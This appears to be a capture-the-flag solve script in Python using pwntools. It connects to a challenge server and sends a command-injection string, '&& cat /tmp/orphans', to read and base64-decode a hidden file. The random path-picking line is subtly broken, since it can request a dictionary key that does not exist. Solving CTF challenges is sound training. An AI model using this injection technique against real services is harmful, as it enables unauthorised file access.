from pwn import *
import random
from base64 import b64decode
random.seed(666)


locations = {
    "0": "/tmp/singularity",
    "1": "/tmp/abyss",
    "2": "/tmp/orphans",
    "3": "/home/council",
    "4": "/tmp/.boom",
    "5": "/home/victim/.consortium",
    "6": "/usr/bnc/.yummyarbs",
    "7": "/tmp/.loab",
    "8": "/tmp/loab",
}
print(locations[str(randint(0,8)+1)])
pr = remote('loabshouse.niccgetsspooky.xyz',1337)

pr.sendline(b'&& cat /tmp/orphans')
pr.recvuntil(b'forever.\n')
pr.recvline()
pr.recvline()
ln = pr.recvline()
print(ln)
print(b64decode(ln.decode()).decode())
print(pr.recvall(timeout=2))